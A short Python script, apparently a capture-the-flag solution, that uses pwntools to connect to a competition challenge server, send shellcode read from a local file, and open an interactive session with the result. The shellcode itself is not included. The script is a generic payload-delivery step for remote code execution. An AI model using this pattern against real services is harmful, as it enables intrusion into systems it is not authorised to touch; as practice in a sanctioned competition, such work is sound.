from pwn import *

p = remote("shellcode.2021.ctfcompetition.com", 1337)
p.recvuntil("Payload:")
shellcode = open("main.shellcode", "rb").read()
print(f"Shellcode length: {len(shellcode)}")
p.send(shellcode)
p.interactive()